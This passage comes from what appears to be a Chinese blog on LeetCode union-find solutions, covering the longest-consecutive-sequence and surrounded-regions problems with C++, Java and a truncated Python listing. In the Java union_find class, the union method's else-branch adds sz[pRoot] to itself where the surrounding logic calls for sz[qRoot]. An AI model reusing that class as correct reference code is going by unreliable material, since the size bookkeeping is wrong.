class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">find</span>(p) == <span class="built_in">find</span>(q);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> qRoot = <span class="built_in">find</span>(q);</span><br><span class="line"><span class="keyword">int</span> pRoot = <span class="built_in">find</span>(p);</span><br><span class="line"><span class="keyword">if</span> (sz[pRoot] &lt; sz[qRoot]) &#123;</span><br><span class="line">id[pRoot] = qRoot;</span><br><span class="line">sz[qRoot] += sz[pRoot];</span><br><span class="line">            M = <span class="built_in">max</span>(M, sz[qRoot]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">id[qRoot] = pRoot;</span><br><span class="line">sz[pRoot] += sz[qRoot];</span><br><span class="line">            M = <span class="built_in">max</span>(M, sz[pRoot]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetMax</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> M;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">longestConsecutive</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">unordered_map&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; um;</span><br><span class="line"><span class="keyword">long</span> N = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (N &lt; <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> N;</span><br><span class="line">union_find* uf = <span class="keyword">new</span> <span class="built_in">union_find</span>(N);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (um.<span class="built_in">count</span>(nums[i])) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (um.<span class="built_in">count</span>(nums[i] - <span class="number">1</span>)) </span><br><span class="line">uf-&gt;<span class="built_in">Union</span>(i, um.<span class="built_in">at</span>(nums[i] - <span class="number">1</span>));</span><br><span class="line"><span class="keyword">if</span> (um.<span class="built_in">count</span>(nums[i] + <span class="number">1</span>))</span><br><span class="line">uf-&gt;<span class="built_in">Union</span>(i, um.<span class="built_in">at</span>(nums[i] + <span class="number">1</span>));</span><br><span class="line">um.<span class="built_in">insert</span>(pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;(nums[i], i));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> uf-&gt;<span class="built_in">GetMax</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="但是">但是</h3><p>但是这道题目，真的必须搞这么麻烦吗？</p><p>也许引入并查集将连续的序列划分为同一连通分量是一种最简单直接的想法，但是我们创建并查集的过程，却需要另外引入哈希表才能相对高效地完成创建操作。既然哈希表就能完成高效地查找，那我们通过不断查找一个数的相邻数是否存在并同时计数，最后得到的最大数不就是我们需要的答案了吗。</p><p>当然这里仅提供一种思路，具体的优化实现就放在哈希表的训练内容中。</p><h2 id="130-被围绕的区域"><a href="https://leetcode-cn.com/problems/surrounded-regions/">130. 被围绕的区域</a></h2><p>难度：中等</p><p>给你一个 <code>m x n</code> 的矩阵 <code>board</code> ，由若干字符 <code>'X'</code> 和 <code>'O'</code> ，找到所有被 <code>'X'</code> 围绕的区域，并将这些区域里所有的 <code>'O'</code> 用 <code>'X'</code> 填充。</p><p><strong>示例 1：</strong></p><p><img src="https://assets.leetcode.com/uploads/2021/02/19/xogrid.jpg" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：board = [[&quot;X&quot;,&quot;X&quot;,&quot;X&quot;,&quot;X&quot;],[&quot;X&quot;,&quot;O&quot;,&quot;O&quot;,&quot;X&quot;],[&quot;X&quot;,&quot;X&quot;,&quot;O&quot;,&quot;X&quot;],[&quot;X&quot;,&quot;O&quot;,&quot;X&quot;,&quot;X&quot;]]</span><br><span class="line">输出：[[&quot;X&quot;,&quot;X&quot;,&quot;X&quot;,&quot;X&quot;],[&quot;X&quot;,&quot;X&quot;,&quot;X&quot;,&quot;X&quot;],[&quot;X&quot;,&quot;X&quot;,&quot;X&quot;,&quot;X&quot;],[&quot;X&quot;,&quot;O&quot;,&quot;X&quot;,&quot;X&quot;]]</span><br><span class="line">解释：被围绕的区间不会存在于边界上，换句话说，任何边界上的 &#x27;O&#x27; 都不会被填充为 &#x27;X&#x27;。 任何不在边界上，或不与边界上的 &#x27;O&#x27; 相连的 &#x27;O&#x27; 最终都会被填充为 &#x27;X&#x27;。如果两个元素在水平或垂直方向相邻，则称它们是“相连”的。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：board = [[&quot;X&quot;]]</span><br><span class="line">输出：[[&quot;X&quot;]]</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>m == board.length</code></li><li><code>n == board[i].length</code></li><li><code>1 &lt;= m, n &lt;= 200</code></li><li><code>board[i][j]</code> 为 <code>'X'</code> 或 <code>'O'</code></li></ul><h3 id="解题思路-2">解题思路</h3><p>题目中解释表明只有边界上的 <code>'O'</code> 及与其相连的 <code>'O'</code> 不会改变，因此我们可以将题目考虑为寻找不与边界相连的 <code>'O'</code> 并将它改为 <code>'X'</code> ，使用并查集即正好将所有与边界相连的 <code>'O'</code> 作为一个连通分量，最后将所有不在该分量内的 <code>'O'</code> 修改为 <code>'X'</code> 即可。</p><p>首先，第一个问题在于如何将所有与边界相连的 <code>'O'</code> 放入一个连通分量，边界上可能会有多个 <code>'O'</code> ，对于不在边界上的 <code>'O'</code> ，我们只能判断它是否与某一边界上的 <code>'O'</code> 相连，最后得到基于边界上不同 <code>'O'</code> 的多个连通分量，这将极大复杂化程序，因此我们必须让所有符合条件的 <code>'O'</code> 存在于同一连通分量中。我们可以在并查集中额外放置一个元素，首先我们遍历边界，将边界上的 <code>'O'</code> 全部与这个元素相连，然后再遍历内部将与边界相连的元素也连接到这个连通分量，最后我们就可以得到符合条件的一整个连通分量。</p><p>第二个问题是如何在并查集中表示这些矩阵元素，这些矩阵都存储在二维数组中，而使用二维坐标进行并查集相关操作显然是非常复杂的，即使可以实现也不值得去实现。由于矩阵的各性质我们可以获得，因此我们可以将矩阵的二维坐标转换为一维坐标。</p><h3 id="具体实现-2">具体实现</h3><p>首先为了完成坐标的转换，定义一个 <code>Convert()</code> 方法，二维坐标到一维坐标的转换需要我们已知三个参数，即二维坐标值 <code>(x , y)</code> 与矩阵宽度 <code>w</code>，满足 <code>A[x][y]=A[x * w + y]</code> 。具体实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Convert</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> w)</span> </span>&#123;</span><br><span class="line"><span class="comment">//x、y 表示二维坐标值，w 表示矩阵宽度。</span></span><br><span class="line"><span class="keyword">return</span> x * w + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进行并查集操作，首先初始化并查集，大小为矩阵的大小加一，多的那一个用来作为所有边界节点的父节点，我们称他为“祖宗节点”，他将与所有边界上的 <code>'O'</code> 相连，实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> len = board.length;  <span class="comment">// 矩阵行数</span></span><br><span class="line"><span class="keyword">int</span> wid = board[<span class="number">0</span>].length;  <span class="comment">// 矩阵列数，即第一行元素数</span></span><br><span class="line"><span class="keyword">int</span> boardSize = len * wid;  <span class="comment">// 矩阵大小（元素个数）</span></span><br><span class="line">union_find uf = <span class="keyword">new</span> union_find(boardSize + <span class="number">1</span>);</span><br><span class="line"><span class="comment">// 初始化并查集，大小为矩阵大小+1</span></span><br></pre></td></tr></table></figure><p>接下来就要遍历边界，将边界中的 <code>'O'</code> 先与“祖宗节点”相连。矩阵坐标是从 1 开始的，因此我们令并查集中的最大元素作为“祖宗节点”，即 <code>boardSize</code> 。由于在遍历的同时需要判断元素是否为 <code>'O'</code> ，因此需要两层 <code>for</code> 循环以二维坐标遍历矩阵。但是我们并不需要遍历整个矩阵，除了首尾两行，其他行我们遍历首尾两个元素即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; wid; ) &#123;</span><br><span class="line"><span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span>)</span><br><span class="line">uf.union(Convert(i, j, wid), boardSize);</span><br><span class="line">        <span class="comment">// 当元素为 O 时将其与“祖宗节点”相连</span></span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">0</span> || i == len - <span class="number">1</span> || j != <span class="number">0</span>)</span><br><span class="line">j++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">j = wid - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 当不在首尾行且位于行首时，直接跳到行尾</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来遍历非边界矩阵元素，如何判断元素是否与边界相连呢，其实不用判断，我们只需将每个元素与其周围的相同元素相连即可，因为最后我们只要判断矩阵中的 <code>'O'</code> 是否与“祖宗节点”相连即可，这也正是我们使用并查集的原因。因此，本次遍历我们将遍历每一个元素，如果为 <code>'O'</code> ，则将它与周围的 <code>'O'</code> 相连，此外，无需遍历边界。实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 有趣的是，本段程序原本并没有在创建新连接之前判断两节点是否</span></span><br><span class="line"><span class="comment"> * 已经相连，而且运行时也并没有报错，但是在用 c++ 实现的过程</span></span><br><span class="line"><span class="comment"> * 中就发现 sz[] 数组爆栈了，原因就是重复创建连接会导致 sz[]</span></span><br><span class="line"><span class="comment"> * 数组中的值翻倍。</span></span><br><span class="line"><span class="comment"> * 然而这实际上应该在 union() 函数中完成，当时我觉得 union()</span></span><br><span class="line"><span class="comment"> * 函数的调用应该基于不相连，事实证明，永远不要让函数的实现基</span></span><br><span class="line"><span class="comment"> * 于信任！</span></span><br><span class="line"><span class="comment"> * 本程序选择在 if 中进行判断，对并查集的修改于 Python 与</span></span><br><span class="line"><span class="comment"> * c++ 中展示。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; wid - <span class="number">1</span>; j++) &#123;</span><br><span class="line">        <span class="comment">// i、j 均跳过首尾，从而跳过边界</span></span><br><span class="line">        <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> index = Convert(i, j, wid);</span><br><span class="line">            <span class="keyword">if</span> (board[i - <span class="number">1</span>][j] == <span class="string">&#x27;O&#x27;</span> &amp;&amp; !uf.connected(Convert(i - <span class="number">1</span>, j, wid), index))</span><br><span class="line">                uf.union(Convert(i - <span class="number">1</span>, j, wid), index);</span><br><span class="line">            <span class="keyword">if</span> (board[i + <span class="number">1</span>][j] == <span class="string">&#x27;O&#x27;</span> &amp;&amp; !uf.connected(Convert(i + <span class="number">1</span>, j, wid), index))</span><br><span class="line">                uf.union(Convert(i + <span class="number">1</span>, j, wid), index);</span><br><span class="line">            <span class="keyword">if</span> (board[i][j + <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span> &amp;&amp; !uf.connected(Convert(i, j + <span class="number">1</span>, wid), index))</span><br><span class="line">                uf.union(Convert(i, j + <span class="number">1</span>, wid), index);</span><br><span class="line">            <span class="keyword">if</span> (board[i][j - <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span>  &amp;&amp; !uf.connected(Convert(i, j - <span class="number">1</span>, wid), index))</span><br><span class="line">                uf.union(Convert(i, j - <span class="number">1</span>, wid), index);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成了上述操作之后，所有符合条件的 <code>'O'</code> 都与“祖宗节点”处于同一连通分量，因此，我们最后遍历一遍矩阵，将不与“祖宗节点”相连的 <code>'O'</code> 全部修改为 <code>'X'</code> ，任务就完成了！当然，这次依然不用遍历边界，毕竟在边界的 <code>'O'</code> 一定与“祖宗节点”相连。实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; wid - <span class="number">1</span>; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span> &amp;&amp; !uf.connected(Convert(i, j, wid), boardSize))</span><br><span class="line">            <span class="comment">// 当 &#x27;O&#x27; 与“祖宗节点”不相连时则修改</span></span><br><span class="line">board[i][j] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，我们就完成了各部分的实现，只需整合一下即可完成本题，完整源代码及其他语言实现将由下方给出。</p><h3 id="源代码-2">源代码</h3><div class="tabs" id="text"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#text-1"><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#h-t-m-java"></use></svg>Java</button></li><li class="tab"><button type="button" data-href="#text-2"><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#h-t-m-Python"></use></svg>Python</button></li><li class="tab"><button type="button" data-href="#text-3"><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#h-t-m-a-c"></use></svg>C++</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="text-1"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">Convert</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> w)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//x、y 表示二维坐标值，w 表示矩阵宽度。</span></span><br><span class="line">        <span class="keyword">return</span> x * w + y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">char</span>[][] board)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = board.length;  <span class="comment">// 矩阵行数</span></span><br><span class="line">        <span class="keyword">int</span> wid = board[<span class="number">0</span>].length;  <span class="comment">// 矩阵列数，即第一行元素数</span></span><br><span class="line">        <span class="keyword">int</span> boardSize = len * wid;  <span class="comment">// 矩阵大小（元素个数）</span></span><br><span class="line">        union_find uf = <span class="keyword">new</span> union_find(boardSize + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 初始化并查集，大小为矩阵大小+1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; wid; ) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span>)</span><br><span class="line">                    uf.union(Convert(i, j, wid), boardSize);</span><br><span class="line">                    <span class="comment">// 当元素为 O 时将其与“祖宗节点”相连</span></span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">0</span> || i == len - <span class="number">1</span> || j != <span class="number">0</span>)</span><br><span class="line">                    j++;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    j = wid - <span class="number">1</span>;</span><br><span class="line">                    <span class="comment">// 当不在首尾行且位于行首时，直接跳到行尾</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 有趣的是，本段程序原本并没有在创建新连接之前判断两节点是否</span></span><br><span class="line"><span class="comment"> * 已经相连，而且运行时也并没有报错，但是在用 c++ 实现的过程</span></span><br><span class="line"><span class="comment"> * 中就发现 sz[] 数组爆栈了，原因就是重复创建连接会导致 sz[]</span></span><br><span class="line"><span class="comment"> * 数组中的值翻倍。</span></span><br><span class="line"><span class="comment"> * 然而这实际上应该在 union() 函数中完成，当时我觉得 union()</span></span><br><span class="line"><span class="comment"> * 函数的调用应该基于不相连，事实证明，永远不要让函数的实现基</span></span><br><span class="line"><span class="comment"> * 于信任！</span></span><br><span class="line"><span class="comment"> * 本程序选择在 if 中进行判断，对并查集的修改于 Python 与</span></span><br><span class="line"><span class="comment"> * c++ 中展示。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; wid - <span class="number">1</span>; j++) &#123;</span><br><span class="line">            <span class="comment">// i、j 均跳过首尾，从而跳过边界</span></span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">int</span> index = Convert(i, j, wid);</span><br><span class="line">                    <span class="keyword">if</span> (board[i - <span class="number">1</span>][j] == <span class="string">&#x27;O&#x27;</span> &amp;&amp; !uf.connected(Convert(i - <span class="number">1</span>, j, wid), index))</span><br><span class="line">                        uf.union(Convert(i - <span class="number">1</span>, j, wid), index);</span><br><span class="line">                    <span class="keyword">if</span> (board[i + <span class="number">1</span>][j] == <span class="string">&#x27;O&#x27;</span> &amp;&amp; !uf.connected(Convert(i + <span class="number">1</span>, j, wid), index))</span><br><span class="line">                        uf.union(Convert(i + <span class="number">1</span>, j, wid), index);</span><br><span class="line">                    <span class="keyword">if</span> (board[i][j + <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span> &amp;&amp; !uf.connected(Convert(i, j + <span class="number">1</span>, wid), index))</span><br><span class="line">                        uf.union(Convert(i, j + <span class="number">1</span>, wid), index);</span><br><span class="line">                    <span class="keyword">if</span> (board[i][j - <span class="number">1</span>] == <span class="string">&#x27;O&#x27;</span>  &amp;&amp; !uf.connected(Convert(i, j - <span class="number">1</span>, wid), index))</span><br><span class="line">                        uf.union(Convert(i, j - <span class="number">1</span>, wid), index);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; wid - <span class="number">1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;O&#x27;</span> &amp;&amp; !uf.connected(Convert(i, j, wid), boardSize))</span><br><span class="line">                    board[i][j] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">union_find</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] id;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] sz;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">union_find</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">        id = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        sz = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">            id[i] = i;</span><br><span class="line">            sz[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> find(p) == find(q);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = p;</span><br><span class="line">        <span class="keyword">while</span> (p != id[p]) p = id[p];</span><br><span class="line">        <span class="keyword">while</span> (tmp != id[tmp]) &#123;</span><br><span class="line">            <span class="keyword">int</span> t = tmp;</span><br><span class="line">            tmp = id[tmp];</span><br><span class="line">            id[t] = p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pRoot = find(p);</span><br><span class="line">        <span class="keyword">int</span> qRoot = find(q);</span><br><span class="line">        <span class="keyword">if</span> (sz[pRoot] &lt; sz[qRoot]) &#123;</span><br><span class="line">            id[pRoot] = qRoot;</span><br><span class="line">            sz[qRoot] += sz[pRoot];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            id[qRoot] = pRoot;</span><br><span class="line">            sz[pRoot] += sz[pRoot];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="text-2"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">quick_union</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, N</span>):</span></span><br><span class="line">        self.<span class="built_in">id</span> = <span class="built_in">list</span>(<span class="built_in">range</span>(N))</span><br><span class="line">        self.sz = [<span class="number">1</span>] *N</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connected</span>(<span class="params">self, p, q</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.find(p) == self.find(q)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span>(<span class="params">self, p</span>):</span></span><br><span class="line">        tmp = p</span><br><span class="line">        <span class="keyword">while</span> p != self.<span class="built_in">id</span>[p]:</span><br><span class="line">            p = self.<span class="built_in">id</span>[p]</span><br><span class="line">        <span class="keyword">while</span> tmp != self.<span class="built_in">id</span>[tmp]:</span><br><span class="line">            t = tmp</span><br><span class="line">            tmp = self.<span class="built_in">id</span>[tmp]</span><br><span class="line">            self.<span class="built_in">id</span>[t] = p</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span 